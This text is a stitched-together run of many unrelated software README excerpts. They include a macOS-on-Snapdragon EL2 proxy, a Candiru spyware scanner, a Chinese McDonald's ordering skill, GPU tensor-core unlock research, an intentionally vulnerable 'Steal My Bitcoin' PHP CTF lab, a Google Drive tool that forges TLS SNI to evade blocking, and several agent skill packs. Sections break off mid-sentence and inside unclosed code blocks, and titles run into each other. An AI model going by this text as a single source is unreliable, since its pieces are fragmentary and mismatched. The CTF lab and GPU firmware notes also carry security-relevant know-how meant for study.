UEFI EL2 proxy forked from Asahi Linux's m1n1. q1n1 takes the machine at EL2
after UEFI and serves m1n1's proxy protocol over USB-C to a Mac host, which
drives Snapintosh from there.

## Status

This is experimental software, written for one laptop model.

| Area | State |
| --- | --- |
| macOS desktop on the A16 | Boots to the desktop with GPU acceleration. Rendering is correct: the pixel checks across the desktop test scenes pass. |
| Smoothness | In progress. Interaction is usable but not yet smooth. The target is a steady ~60 Hz first and the panel's 120 Hz later. |
| Input | The built-in keyboard and touchpad work, including trackpad gestures, Mission Control and app switching. |
| Wi-Fi (QCC2072) | Scanning, a WPA2 connection, DHCP and ping work through a host-proxy harness driven from the Mac. Joining from the macOS Wi-Fi menu does not work yet. |
| Storage | macOS is installed on, and boots from, the internal NVMe. |
| Other hardware | Audio, cameras, Bluetooth, sleep and external displays are not supported. |

[docs/STATUS.md](docs/STATUS.md) has the details, the known issues and the
roadmap.

## Required hardware

- An **ASUS Zenbook A16 with the Snapdragon X2 Elite X2E-96-100** (UX3607OA).
  Nothing else is supported. The monitor, device tables, clocks and register
  addresses are specific to this machine.
- A **Mac host** running macOS 27, connected to the A16 over USB-C. q1n1 brings
  up a USB NCM network link on that cable, and every boot, upload and log
  capture goes over it.
- AC power is strongly recommended. The tools refuse to boot or write the SSD
  below a battery threshold.

# Zero Breach

> Release v0.1.8 corrects the version the download reports (v0.1.7 shipped
> reporting itself as 0.1.6) and refuses network paths given to `--iocs`/`--json`
> in the single-file build. Optional Candiru patterns still need the pinned YARA-X engine;

[![tests](https://github.com/interplains/zero-breach/actions/workflows/tests.yml/badge.svg)](https://github.com/interplains/zero-breach/actions/workflows/tests.yml)

A local, read-only scanner that checks a computer for traces of the **AdFection /
Candiru** spyware campaign — the operation in which an ad-tech company used
real-time ad bidding to deliver zero-click spyware to targeted people. Tested on
Windows, macOS and Linux (Python 3.8–3.12) in CI.

It searches the machine's own leftover records — browser history, cookies, caches
and connection records, file fingerprints, auto-start registrations, known
malware file-paths and the DNS resolver cache — for published indicators, and
reports what it found, how strong the evidence is, and just as importantly
**what it could not check**.

> **A clean result is not a clean bill of health.** Spyware of this grade is built
> to defeat exactly this kind of check, most of the evidence it leaves expires
> within weeks, and Windows does not record DNS history unless someone turned it
> on. This tool narrows uncertainty; it does not remove it. If you have real
> reason to believe you are a target, the right step is expert help — the
> [Access Now Digital Security Helpline](https://www.accessnow.org/help/) or the
> [Amnesty International Security Lab](https://securitylab.amnesty.org/) — not a
> self-service script.

## Background

In October 2026 The Citizen Lab documented how the ad-tech firm Discover-Tech used
its **Controlium** platform to fingerprint and infect devices the moment an
advertisement was rendered, delivering Candiru spyware with no click required.
At least 45 devices at Al Jazeera were targeted across 2024–2025. The indicator
set here is drawn from that reporting and from Recorded Future's independent
tracking of the same infrastructure.

The delivery vector abuses real-time ad bidding. Keep operating systems and
browsers updated, reduce exposure with ad filtering, and investigate surviving
traces where appropriate. This tool checks those traces; it does not replace
updates or establish that a device is safe.

- The Citizen Lab, *Exposing AdFection* (2026-10-15)

# 麦当劳自助管家 · McButler

> 一个基于麦当劳官方 MCP 的点单参谋：**帮你把「省钱」「健康」「省时间」三个约束同时解开**，
> 顺便用信贷评分卡的思路给你打个「麦险分」，并在等餐的三分钟里放一场五个小人吵架的小剧场。

参赛：麦当劳程序员节创意开发大赛 · 开发 Skill 赛道
MCP：`https://mcp.mcd.cn`（Streamable HTTP）

**在线体验小剧场** → https://jouaaaaaa.github.io/mcd-self-butler/demo/theater.html
**仓库** → https://github.com/jouaaaaaa/mcd-self-butler

![麦门小剧场](docs/theater.png)

---

## 一、它到底解决什么问题

不是「推荐一个套餐」这么简单。真实场景里，用户同时被三件事夹着：

| 场景 | 用户的真实处境 | 大多数工具的做法 | McButler 的做法 |
|---|---|---|---|
| **午休只有 40 分钟** | 想快、想吃好、不想多花钱 | 按价格排序 | 算「全成本」：商品价 + 走路时间 + 排队时间 |
| **在减脂但嘴馋** | 想要能吃的数据，不是「少吃点」 | 甩一个热量数字 | 拆套餐 → 逐项对营养表 → 给可执行的替换方案 |
| **部门 30 人团餐** | 预算、忌口、口味全都不一样 | 报一个总价 | 分群配餐，输出可直接算价的 `items` |

一句话：**别人帮你选一个餐，McButler 帮你把这一餐的所有约束一次性对平。**

---

## 二、六个能力

| # | 能力 | 命令 | 一句话说明 |
|---|---|---|---|
| 1 | 每日推荐 | `recommend` | 省钱 / 健康 / 人气三种模式，各自一套排序逻辑 |
| 2 | 健康体检 | `health` | 把套餐拆成子项逐项对表，输出热量·蛋白·脂肪·钠·钙 + 扣分明细 |
| 3 | 门店比价 | `stores` | 最近 / 最便宜 / 综合全成本 |
| 4 | 团餐配餐 | `bulk` | 按忌口与口味分群，N 人份自动配比，输出可直接下单的 items |
| 5 | 麦险分 | `credit` | 六维信贷评分卡，账户级 + 订单级双评级 |
| 6 | 麦门小剧场 | `theater` | 五个小人用你的券和信用分吵架，吵出最省钱方案 |

### 1. 每日推荐

三种模式不是换个排序字段，而是三套不同的价值函数：

- **省钱**：`0.55 × 价格归一 + 0.30 × 折扣力度 + 0.15 × 每 100kcal 单价`
  —— 用「每 100 kcal 多少钱」防止用小食刷低价格。
- **健康**：`0.75 × 健康分 + 0.25 × 能量贴合度`，并对有实测数据的候选加权 3 分。
- **人气**：`0.7 × 热度 + 0.3 × 折扣`，热度 = 爆款标签 + 你的历史常点。

### 2. 健康体检（本项目的技术核心）

麦当劳的营养接口只给**单品**，不给套餐。所以任何「巨无霸三件套 949 kcal」都必须自己算：

```
query-meal-detail("巨无霸三件套")
  └─ rounds[isDefault=1] → 巨无霸 / 中薯条 / 可乐中杯
      └─ list-nutrition-foods 逐项查表
          └─ 513 + 289 + 147 = 949 kcal · 钠 1126mg · 蛋白 31g
```

评分是 100 分制扣分：能量区间(30) + 蛋白质(20) + 脂肪供能比(20) + 钠(20) + 糖油负担(16) + 蔬果加分(+10)。
完整公式见 [`references/model-spec.md`](references/model-spec.md)。

**并且明确标注数据质量**：`实测` / `官方` / `估`。拿不到数据就不给分（`健康分 —`），绝不编数字。

### 3. 门店比价：我们不打价格战，我们打全成本

```
全成本 = 商品价 + 距离成本(往返 0.5 元/km) + 时间成本((步行往返 + 排队) × 0.30 元/分钟)
```

真实数据（同一份巨无霸三件套，三家店都是 ¥36.5）：

| 门店 | 距离 | 排队 | 全成本 |
|---|---|---|---|
| 静安锦沧文华 | 548m | 4min | **¥42.2** |
| 吴江路（离你最近） | 234m | 18min | ¥43.8 |
| 仙乐斯 | 1011m | 6min | ¥46.6 |

> 结论：走多 314 米，省 1.6 元和一个坏心情。最近的店不是最划算的店。

### 4. 团餐配餐

30 人 / 人均 30 元 / 5 人不吃牛 / 4 人不吃辣，输出：

```
分群：不吃牛 5 · 不吃辣 4 · 健康派 9 · 辣党 9 · 实惠派 3
合计 ¥772.8（原价 ¥1444.5，省 ¥671.7）人均 ¥25.8 · 人均 661 kcal · 5 个不同套餐
```

并且直接给出可串联 `calculate-price` 的 `orderItems`：

HatchZip

Extract huge archives in place. The archive shrinks as your files hatch,
so you only need free space for the output, not for the output and the archive.

Installation | Usage | Safety | How it works | Contributing

A 180 GB game download that unpacks to 200 GB needs 380 GB of disk with WinRAR, 7-Zip or `unzip`, because the archive and everything extracted from it have to exist at the same time. HatchZip needs a little over 200 GB. It extracts the archive from the end and cuts each finished part off the archive file as it goes, so the space the archive gives back is reused for the next files. It checks that the extraction will fit before it changes anything, keeps a safety margin of free space the whole way through, and can be stopped or crash at any moment and pick up where it left off. It reads ZIP, 7z, tar, `.tar.gz` and split archives. ### Get it No coding needed. **[Download for Windows](https://github.com/xevrion/hatchzip/releases/latest/download/HatchZip-x64-setup.exe)** (Windows 10 and 11), or for [macOS (Apple Silicon)](https://github.com/xevrion/hatchzip/releases/latest/download/HatchZip-aarch64.dmg), [macOS (Intel)](https://github.com/xevrion/hatchzip/releases/latest/download/HatchZip-x86_64.dmg) and [Linux](#installation). 1. Run the installer. Windows may show "Windows protected your PC" because HatchZip is not code-signed yet: choose **More info**, then **Run anyway**. 2. Right-click the archive, choose **HatchZip**, then **Extract here**. On Windows 11 the menu is under **Show more options**. 3. Or open HatchZip from the Start menu, open the archive, and choose **Extract**. HatchZip shows whether the files will fit before it changes anything. NVIDIA ships GeForce cards with their tensor cores capped to **half speed** for
FP16, BF16 and TF32 math with FP32 accumulation, which is what nearly all AI
training and unquantized inference uses. The same silicon sold as an RTX A-series
or professional card runs at full rate. `gpu_unlock` removes that cap at boot,
before the stock NVIDIA driver loads. No patched driver, no VBIOS flash, nothing
to redo when NVIDIA releases a new driver.

# CleanFrame

A quieter home screen for Samsung The Frame. Your apps, a photograph and the time, with an interface made for the TV remote.

![CleanFrame browser preview using the bundled Manrope font](docs/images/cleanframe-dock.jpg)

I built CleanFrame for one TV: my own Samsung The Frame, running Tizen. I'm sharing the code and setup notes as a starting point for other people to build on.

**Use it at your own risk.** Most of the work has gone into making it work well on my TV. Very little has gone into making it portable. The setup scripts reflect my computer, TV and firmware, so expect to adapt them and test the result on your own hardware.

I highly recommend forking it and building on top of it, ideally with a coding agent that can help you understand and adapt the setup. Start with the browser preview, make the interface your own, then work through TV installation when you're ready. Native Home/startup changes need particular care; the setup guide covers the risks and recovery steps.

## Try the interface

You need Node.js 22+ and Python 3.10+ to run the browser preview.

```sh
git clone https://github.com/nthnclrk/CleanFrame.git
cd CleanFrame
npm ci
npm run dev:public
```

Open [localhost:4795/home/](http://localhost:4795/home/). Use the arrow keys, Enter and Escape, or click the controls. App launches and Samsung screens require a TV; the preview reports that limitation when you select them.

The public preview uses the included Manrope, Geist and Newsreader fonts.

## What you can change

- Choose a List or Dock layout, with icons, names or both.
- Use a photograph, light or dark background, with a simple 12-hour clock.
- Adjust typography, focus and glass materials through the same Settings interface.
- Choose and reorder Home apps; discover installed apps on the TV.
- Select from fifteen wallpapers and save your preferences locally.

The glass and blur are rendered ahead of time. The TV loads the finished images and uses transforms and opacity for focus feedback.

## Use a coding agent

Open this repo in a local coding agent and give it a bounded change:

```text
Read AGENTS.md, docs/development.md and docs/interaction-behaviour.md.
Help me adapt CleanFrame. Start with the public-font browser preview.
My first change is: <describe one change>.
Preserve remote navigation, saved preferences and the ES5 runtime.
Run the source checks and relevant browser checks. Show the result.
This task is browser-only: do not connect to a TV, sign or install a
package, or change Home/startup settings.

See [working with an agent](docs/for-agents.md) for the TV setup prompt and the distinction between UI work, app installation and native Home changes. An agent needs local computer access for TV work; a hosted chat cannot reach your TV merely by reading this repo.

# KohakUnlock

**Source-first research on volatile NVIDIA tensor-compute unlocks. Not a universal GPU unlocker.**

This repository documents a successful **Linux/initramfs port for one VRAM-modified Leadtek RTX 2080 Ti (11 GB → 22 GB; 22 GiB reported)** and running the upstream Ampere unlock on four RTX 3090s. It includes Turing source, offline tests, ROM analysis, inventory tooling, and a fail-closed boot-hook template. It does **not** include firmware blobs, ROM dumps, prebuilt kernel/EFI binaries, a flash utility, or an automatic installer.

**Risk:** experimental privileged firmware execution can hang a GPU or host, prevent boot, corrupt data, or damage hardware. There is no guarantee of recovery. Have physical/BMC console and power control. Never experiment on an active workload. Editing IDs or removing guards does not validate a new card.

**The 22 GB cards are physically VRAM-modded, not factory 22 GB models.** Both the unlocked card and locked comparison card already had that modification. This software unlock does not add VRAM, and the repository does not provide a memory-soldering guide.

## Results

| Test | Locked | Unlocked | Comparison |
|---|---:|---:|---|
| 2080 Ti FP16→FP32 `mmapeak`, 32×8×16 | 59.9 TFLOPS | 111.0 TFLOPS | Same card before/after; +85.3% |
| 2080 Ti FP16→FP16 control | 119.5 TFLOPS | 118.5 TFLOPS | Same card; essentially unchanged |
| 2080 Ti best MAMF median, 125-shape sweep | 57.71 TFLOPS | 88.24 TFLOPS | Two same-model cards; +52.9%, not same-card A/B |
| One 3090, FP16→FP32 8192³ PyTorch GEMM | 73.03 TFLOPS | 122.76 TFLOPS | Same card; +68.1%* |

*3090 power limits: 370 W stock / 360 W unlocked. [Measurement details](docs/RESULTS.md#ampere).

See [results and limitations](docs/RESULTS.md). A successful kernel log alone is not proof of higher throughput. BF16/TF32 are not added to Turing. This is not a claim of a 2× application/game speedup.

## Start here

1. [Safety and scope](docs/SAFETY.md)
2. [Agent engineering guide](docs/AGENT-GUIDE.md): investigation, porting, failure lessons
3. [2080 Ti reproduction](docs/TURING.md): inputs, build, one-shot boot, verification, recovery
4. [3090 experience](docs/AMPERE.md): upstream and known-working revision
5. [Licensing/provenance](NOTICE.md)

```sh

# SuperMimic reproduction on Isaac Lab 3 (kit-less, MuJoCo-Warp)

**Unofficial** reproduction of *SuperMimic: Scaling Humanoid Whole-Body Control with One Differentiable World
Model* (arXiv 2610.28480) — no official code is released, so everything here is implemented from
the paper. Target experiment: the controlled LAFAN1 comparison (Fig. 4a): 40 G1-retargeted LAFAN1
clips (2.45 h), one GPU; the paper reaches evaluation normalized return 0.82 after 1.2 h on an H100.

Author: **Chong Zhang** (ETH Zurich). License: [MIT](LICENSE).

> **Disclaimer:** this repository was speed-vibecoded in 1 hour with an AI coding
> assistant. It
> deliberately does not live under any lab's organization, because the code is too much "slop"
> for that: fast and unreviewed. Use it at
> your own risk.

> **One G1 motion tracker for all 40 LAFAN1 clips, trained in only ~1.5 GPU-hours**
> (1.47 h on a single RTX PRO 6000): evaluation return **0.829** with **0/40 failed clips**.
> For scale, the paper's PPO-in-simulator baseline does not reach return 0.82 within 18 h on up to
> 8 GPUs.

![SuperMimic G1 tracking LAFAN1 motions](results/supermimic_lafan1_highlight.gif)

*Solid robot: the trained policy simulated in Isaac Lab with MuJoCo-Warp. Blue ghost: the reference
motion. Clips: dance, jumps, fall-and-get-up, sprint.*

| Path | What |
|---|---|

| `supermimic/` | implementation (see below) |

rossark0/rossark-motion-skill.content: # Motion For Anything You Draw For designers and engineers who want to bring their apps and drawings to life. Making a drawing move is easy. Making it feel alive is hard: it has to breathe, look around, blink, shift its weight and act, without ever freezing or jumping. This skill helps your agent get there. It started as the method I used to bring the illustrations in my app to life, and grew into a way to animate anything drawn: characters and creatures, plants, cloth, fire, smoke, water, weather, lights, machines, icons, logos, charts and whole scenes. The animation above is drawn and animated entirely in code, with the templates in this repo. ## Install ```bash npx skills@latest add rossark0/rossark-motion-skill ``` ## Why use it? Agents don't animate like animators. Ask an agent to bring a character to life and it will often swap one drawing for another, so the face teleports from one expression to the next. It moves through each pose with its own eased tween, so the body stops dead at every pose. Everything moves in sync, like a machine. Blinks are so short they flicker, everything bounces, and a thin line shows across the face where two shapes meet. All these small things add up, and the result looks like a slideshow instead of something alive. This skill lists those mistakes and how to fix them: one clock for the whole scene, parts that turn around their real pivots, trailing parts that follow a beat later, idle life that never stops, smooth paths through key poses, small amplitudes and strong curves. When you have a reference video, it measures the motion frame by frame before building, because what makes a reference feel alive is often too small to see. For motion in an interface, it follows [Emil Kowalski's](https://github.com/emilkowalski/skills) rules and Benji Taylor's [Family values](https://benji.org/family-values). ## Reference - **[SKILL.md](./SKILL.md)**: The skill. Principles, recipes for every kind of subject, live faces, full-body acting, scenes that tell an action, motion in an interface, pitfalls, working from a reference video, and a workflow. - **[MOTION.md](./MOTION.md)**: A notes file for your project. Copy it next to your art and fill in Part 2 as you go: where the code is, your rules, what your art can't do, and how you check changes. GEOInflow brings website visitors, AI search referrals, server crawl logs, and content inventories into a shared website context. It helps teams understand which AI crawlers visit their sites, which pages they request, which important pages have no observed crawl activity, where requests fail, and how AI search contributes visitors and conversions.

# Steal My Bitcoin — open source lab

Recreate the completed challenge with a local practice environment and the source
of the original deployment kit. The practice copy contains a public dummy flag,
has no wallet or prize, and makes no requests to external balance APIs.

# WARNING

This was a heavily AI-assisted challenge in terms of the infrastructure setup. Basically just "Codex, give me a server with PHP on it" + some hardening steps to keep the solves focused on the RCE path.

Rely on it at your own risk.

## Run locally

Install Docker Engine or Docker Desktop with Docker Compose v2 or newer. Use an
isolated Linux lab VM for this intentionally vulnerable runtime. The original
runtime is amd64; ARM machines require working amd64 emulation.

From this directory:

```bash
docker compose up --build -d
```

Open <http://127.0.0.1:8080>. Check the endpoints:

```bash
curl --fail http://127.0.0.1:8080/php-version.php
curl --fail --data 'message=ping' http://127.0.0.1:8080/ping.php
```

The second command should print `pong`. Port 8080 must be free. The first build
downloads the pinned PHP base image and compiler packages. Package repositories
are not snapshotted, so independently compiled helpers may differ byte for byte.

Verify the intended permissions and helper with:

```bash
python3 tools/verify.py
```

This is an operator check using Docker access, not a solution through HTTP.
To stop the lab and remove its container and network:

```bash
docker compose down
```

Starting again restores the same public dummy flag. To rebuild after source edits:

```bash
docker compose up --build -d
```

## How the challenge works

PHP runs as the unprivileged `www-data` user. `/flag` is owned by container root
with mode `0400`, so PHP cannot read it directly. The root-owned helper
`/usr/local/bin/print-flag` has mode `4755`: executing it gives that program an
effective root UID so it can read the flag and write it to standard output.
The participant's goal is to reach helper execution through the web application.
Read its complete source in `helper/print-flag.c`.

`php-version.php` reports the runtime version. `ping.php` responds to
`POST message=ping` with `pong`; other methods receive 405 and other messages
receive 400. Neither endpoint intentionally provides command execution.

Although the base image is named `php:8.4.26-fpm-alpine`, requests are served by
`php -S`, the CLI HTTP server. An exploit must apply to that SAPI and configuration.

## Reproduce the VPS setup

The [VPS guide](deployment/README.md) covers Nginx, HTTPS, container isolation,
logging and operation on a fresh Debian 13 amd64 host. It includes the original
configuration so readers can investigate the complete request path.

Nginx terminated HTTPS and proxied requests to PHP's CLI server.

The local lab preserves the pinned PHP runtime, CLI HTTP server, eight workers,
non-root PHP process and root-owned setuid helper. It uses a simpler teaching page

lyramakesmusic/neuron-explorer.content:
# neuron explorer

Steering-first neuron explorer for Qwen3.5-4B. Every MLP neuron in a layer is pushed up and down on a few prompts, every
rollout is kept, and the explorer lays the results out over a 3D view of the model.

![neuron explorer](explorer.png)

## Explorer

    uv sync
    uv run python explorer/server.py        # http://localhost:8791

Reads sweep runs from `runs/` and per-layer stats from `stats/`, both produced by the sweep below; the caches in
`explorer/cache/` ship with the repo. Loads Qwen3.5-4B locally (MPS, CUDA or CPU) for live
steered chat, lens, connections and live inference over your own text.

- **map**: the model's layers in perspective, attention and MLP per layer, one point per neuron. Hover shows a neuron's
  steer lens and logit lens; click opens it; click a layer's label to view its sheet face-on. `writes` places
  neurons with similar down-projection columns next to each other.
- **list**: units ranked by word-cluster mass against random-direction controls; `lens` searches the steer and logit
  lenses for a token, `fires` runs your text through the model and filters neurons by activation.
- **neuron**: steered rollouts per prompt and dose, a three-column multi-turn steered chat (−, 0, +), lens and
  connections, and a name.
- **embeddings**: UMAP of a layer's rollouts, coloured by neuron, prompt, dose or kind.
- **Claude** (fourth neuron-panel tab, or the right-edge handle): a chat running the `claude` CLI (installed and
  logged in) with the explorer as an MCP server (`explorer/agent_mcp.py`). It reads neurons, cones and lenses, runs the
  live model (steering, activations, next-token logprobs, ablations), moves the map, list and highlights, and has file
  tools and a shell in your home folder. Its prompt is `explorer/agent_prompt.md` plus `explorer/agent_methodology.md`, and
  `explorer/agent_prompt.local.md` when present (untracked, for your own additions);
  `EXPLORER_CLAUDE_MODEL` picks the model. The server answers only pages and tools on this machine.

## Sweep

Runs on a CUDA 13 GPU pod with the steering fork of vLLM ([RhizoNymph/vllm](https://github.com/RhizoNymph/vllm)).

    bash sweep/setup_pod.sh                                   # fork, deps, model; writes /workspace/env.sh
    python sweep/neuron_stats.py --layers 22 --tokens 2000000 --out stats/q35-4b
    python sweep/steer_sweep.py --stats stats/q35-4b_L22.npz --design main_rel --dose-unit rel \
        --neurons all --random-controls 256 --run q35-4b-L22
    sweep/run_depth.sh "4 9 13 17" 384 64                     # random-subset sweep across several layers

`main_rel` doses are fractions of the median residual norm leaving the layer: {who, snake, orange} × {−0.7, +0.5, +0.8}
and {free} × {+3}, plus one unsteered baseline per prompt.

| script | output |
|---|---|
| `sweep/neuron_stats.py` | per-neuron activation extremes by sign regime, down columns, residual norms |
| `sweep/steer_sweep.py` | `runs/<run>.jsonl`: text, token ids, logprobs, to…

mizorewww/gdirect.content:
# gdirect

[中文](README.zh-CN.md) · [Changelog](CHANGELOG.md)

gdirect browses, downloads, uploads and mounts your Google Drive from the terminal. It finds Google IPs that are reachable from your network and sends Drive traffic straight to them, with multi-connection, resumable downloads.

## How it works

| Traffic | Route |
| --- | --- |
| Drive API, downloads, uploads (`browse`, `ls`, `download`, `upload`) | A scanned Google IP. The hostname and certificate check stay the same. If connections carrying the real SNI are reset, gdirect automatically retries under a forged identity (`g.cn` as TLS name, the real host in the Host header) — same idea as Sheas-Cealer — and remembers what worked per IP |
| Sign-in, account verification and token refresh (`accounts.google.com`, `oauth2.googleapis.com`, `www.googleapis.com`) | Your normal system network (DNS, proxy) |
| `mount` (rclone) | Your normal system network |

The first transfer command checks a known relay and sweeps Google's own front ends, and keeps the ones that work for 24 hours. The relay, 183.56.143.147, is not Google: it forwards connections to Google, which makes it fast and stable in mainland China, so it is tried first. It cannot read your traffic (TLS runs end to end and is verified against Google's roots), but its operator sees your IP address and, unless the forged identity is used, which Google host you connect to. To avoid it, pass `--google-only` (or set `GDIRECT_GOOGLE_ONLY=1`); only Google's own front ends are then used. Those come from the address space Google publishes as its own ([goog.json minus cloud.json](https://knowledge.workspace.google.com/admin/security/obtain-google-ip-address-ranges), embedded and refreshed weekly). Most Google IPs are blocked in mainland China, but some front ends are not: the sweep tries a TCP connection first, fully verifies only what answers (TLS, the Drive API and a test download), and stops once it has 8. Each candidate is probed with the real SNI first, then with the forged identity. If an endpoint (the relay included) stops answering, requests and downloads move to the next verified one. `login` and `mount` do not scan. Certificates are verified against Google's own GTS roots (embedded in the binary), never against a system CA bundle — a compromised third-party CA cannot impersonate Google for gdirect.

Network requirements:

- Sign-in needs browser access to `accounts.google.com` and application access to `oauth2.googleapis.com` and `www.googleapis.com`. Token refresh needs `oauth2.googleapis.com`. If Google is blocked, keep a proxy available for these requests, including during transfers.
- If you use a TUN-mode proxy or VPN (for example Clash/Mihomo TUN), route Google's IP ranges **DIRECT** and turn off fake-ip for them. A TUN proxy accepts every connection, so otherwise the scan measures the proxy instead of your network; `scan` warns when it sees this. `gdirect scan --list` shows the IPs in use.

DenisSergeevitch/ex-ussr-kinship-researc.content:
# ex-USSR Kinship Research

![ex-USSR Kinship Research cover](docs/cover.jpg)

**An evidence-first genealogy skill for AI agents (Codex, Claude Code and other Agent Skills runtimes).** It turns an agent into a careful family-history researcher for the former USSR, the Soviet Union and the Russian Empire. The agent reads church books and civil records, military, deportation and repression files, and unindexed archive scans. It keeps every find traceable, separates records from interpretation and says plainly what is proven and what is not.

Coverage includes all 15 former Soviet republics: Russia, Ukraine, Belarus, Moldova, Estonia, Latvia, Lithuania, Georgia, Armenia, Azerbaijan, Kazakhstan, Kyrgyzstan, Tajikistan, Turkmenistan and Uzbekistan. Archives are chosen by the event's historical jurisdiction and current record custodian; a regional example does not replace local research.

The skill's instructions are written in Russian, but **the agent talks to you in your language**: English, Ukrainian, Russian, Polish, German and so on. It quotes sources in their original spelling with a translation, and builds search queries in the languages of the records.

---

## What it does

- **Case intake and scope.** One research question, known facts, who may be alive, what is off-limits.
- **Reproducible registers.** Persons, artifacts, claims, relationships and a full search log (CSV), plus a final report template.
- **Historical jurisdiction model.** It resolves every event to the state, province, district, parish or civil registry *as of the event date*, not today's map.
- **Name-variant matrices.** Pre-reform Russian, Ukrainian, Polish, Romanian, German and Yiddish forms, patronymics, maiden names and transliterations.
- **Source strategy.** Originals first, then official catalogs, indexes, published document collections, and only then trees and forums as leads.
- **Evidence protocol.** Claims get explainable statuses, not percentages: `hypothesis`, `single-source`, `corroborated`, `strongly-corroborated`, `contradicted`, `unresolved`. Copies and mirrors of one record share an `independence_group`, so they never count as independent proof.
- **Identity resolution.** Namesakes stay separate `person_id`s until distinguishing evidence appears: house number, parents, godparents, exact birth date or military unit.
- **Audit script.** It checks referential integrity and flags weak corroboration before you write conclusions. An independence group counts only when a cited artifact belongs to it, so corroboration cannot be declared into existence. It also checks the final report: every cited ID must exist in the registers and every status must match them. A summary shows what is still uncorroborated or marked illegible.
- **Final report.** Every relationship is laid out edge by edge, with contradictions, failed searches and concrete next steps.

# scx_pgtier

A two-tier, deliberately *unfair* [sched_ext](https://github.com/sched-ext/scx) (eBPF) CPU scheduler
for PostgreSQL servers that run short transactions next to long-running queries.

**It is built for mixed workloads.** It trades some background throughput for lower latency of the
time-sensitive work. It is not meant for a server that only runs one kind of work.

> **Status: early and experimental.** Tested only in a virtual machine, on one synthetic workload.

## Where this comes from

This is an independent, open-source implementation of the idea described in

> C.-E. Bilodeau-Savaria, J. K. Nidzwetzki, S. Scherzinger, B. Kemme.
> *Unfair by design: eBPF-based scheduling of mixed database workloads.*
> [arXiv:2605.02377](https://arxiv.org/abs/2605.02377)

I am not affiliated with the authors and I did not have access to their code. The paper does not
include a code-availability statement, so everything here was written from the paper's description.
Credit for the idea goes to them. Mistakes in this implementation are mine.

Parts of the code are derived from `scx_simple` (Copyright Meta Platforms, Inc.; Tejun Heo,
David Vernet). Their notices are kept in the source files.

## What it does

PostgreSQL work is split into two tiers by **cgroup name**:

- **time-sensitive** tier (`ufs-ts-*`): short transactions. These run first.
- **background** tier (`ufs-bg-*`): long reports and maintenance. These share whatever CPU is left,
  fairly between cgroups.

A small PostgreSQL extension (`pgext/`) puts each backend into the cgroup of its tier, based on its
role. The scheduler is *selectively unfair*: a time-sensitive task that wakes up can take the CPU from a
background task at once.

## Results

Setup: 8-vCPU VM, PostgreSQL 16, `pgbench` with 8 clients plus 8 long report queries running in a loop,
30 s per run, scheduler on and off alternated, median of 5 runs after one discarded warm-up pair.
Repeating the whole set gives results that differ by a few percentage points.

| Mixed workload, full speed | scx_pgtier | EEVDF (stock) | change |
|---|---|---|---|
| transactions per second | 16,682 | 14,358 | +16% |
| p99 latency | 0.90 ms | 2.06 ms | -56% |
| p99.9 latency | 3.0 ms | 6.4 ms | -53% |
| report queries completed | 160 | 187 | -14% |
| report queries completed, same transaction rate (12k tps) | 163 | 175 | -7% |

| Solo (no report queries) | scx_pgtier | EEVDF (stock) | change |
|---|---|---|---|
| transactions per second | 19,810 | 25,885 | -23% |
| p99 latency | 0.66 ms | 0.53 ms | +24% |

- **The time-sensitive tier gains at the background tier's expense.** About 7% fewer report queries
  complete at equal transaction work.
- **Maximum latency is not improved.** The slowest single transaction in a run is longer with
  scx_pgtier (median 45 ms against 21 ms). It is one event per run and noisy, but it is not better.

How to reproduce these numbers: [docs/BENCHMARK.md](docs/BENCHMARK.md).

## Build and run

# tstack

The agent skills I use every day, cleaned up so anyone can use them. They work
in Claude Code and Codex. Some use [T3 Code](https://github.com/pingdotgg/t3code)
features when they are available and fall back to native tools when they are
not.

## Skills

| Skill | Say | What it does |
|---|---|---|
| `full-send` | "full send" | Takes a change to a merged PR with nobody watching: proves it, reviews it, files it, babysits it, merges it. |
| `full-stop` | "full stop" | Same as `full-send`, but stops when the PR is ready for you to merge. |
| `council` | "council" | Gets review from three models from different providers, and loops until they agree. |
| `sol-loop` | "sol loop" | Reviews a change with GPT Sol in a loop until both agents agree. |
| `file-pr` | "file a PR" | Files a short PR that leads with the problem, not an inventory of changes. |
| `takeover` | "take over" | Finishes someone else's PR, branch, or agent thread, and keeps their credit. |
| `babysit-pr` | "babysit" | Watches a PR through CI and review bots, and fixes the real findings. |
| `modernize` | "modernize" | Rebases an old PR and decides if it should still exist. |
| `leaving-pr-comments` | (automatic) | Formats comments that an agent posts on your behalf. |

Some skills call others. Install the ones they need too:

- `full-send` uses `sol-loop`, `file-pr`, and `babysit-pr`.
- `full-stop` uses `full-send`.
- `takeover` uses `modernize`, `file-pr`, `babysit-pr`, and `leaving-pr-comments`.
- `file-pr`, `babysit-pr`, and `modernize` use `leaving-pr-comments`.

## Install

```bash
git clone https://github.com/t3dotgg/tstack
cp -R tstack/skills/* ~/.claude/skills/   # Claude Code
cp -R tstack/skills/* ~/.codex/skills/    # Codex
```

## Requirements

- An authenticated [GitHub CLI](https://cli.github.com) (`gh`).
- `python3` for `babysit-pr`'s `pr-wait` script.
- `council` and `sol-loop` need subagents on other providers' models. T3 Code
  does this with `delegate_task`. Otherwise you need a harness that can run
  those models.

## Make them yours

These are starting points. Edit them. Put personal settings, like which models
sit on your council, in your `CLAUDE.md` or `AGENTS.md`, so you can update the
skills without losing them.

## License

[MIT](LICENSE)

# ub-mode

`ub-mode` is an agent skill that enforces disciplined software engineering principles when writing or changing code. It is loosely based on portions of [@poteto](https://github.com/poteto)'s rules (`poteto-mode` / `pstack`), reduced and paired with deterministic quality-gate tools:

1. **First Make it Work** — Laziness Protocol, Foundational Thinking, TDD, Redesign From First Principles, Attack the Premise, Subtract Before You Add, Outcome-Oriented Execution, Build the Lever, and Architecture (Model the Domain, Boundary Discipline, Type System Discipline, Make Operations Idempotent, Separate Before Serializing Shared State).
2. **Then Make it Right** — Fix Root Causes, Sequence Work into Verifiable Units, Test Behavior (Not Implementation), [Crapper](https://github.com/unclebob/crapper) (`CRAP < 10`), [Dryer](https://github.com/unclebob/dryer) (duplication `< 0.8`), [Mutator](https://github.com/unclebob/mutator) (cover the uncovered, kill the survivors, delete dead code), and Refactoring.
3. **Practice** — Keep a Log, Guard the Context Window, Worktree Cleanup, and Commit and Push in small ordered commits.

## Companion Tool Repositories

`ub-mode` relies on deterministic quality-gate tools to enforce structure, complexity, duplication, and test thoroughness:

- [unclebob/crapper](https://github.com/unclebob/crapper) — Computes cyclomatic complexity, test coverage, and CRAP score per function so every function stays under the CRAP threshold (`< 10`).
- [unclebob/dryer](https://github.com/unclebob/dryer) — Detects structural code duplication so duplicate blocks (`>= 0.8` similarity) are eliminated.
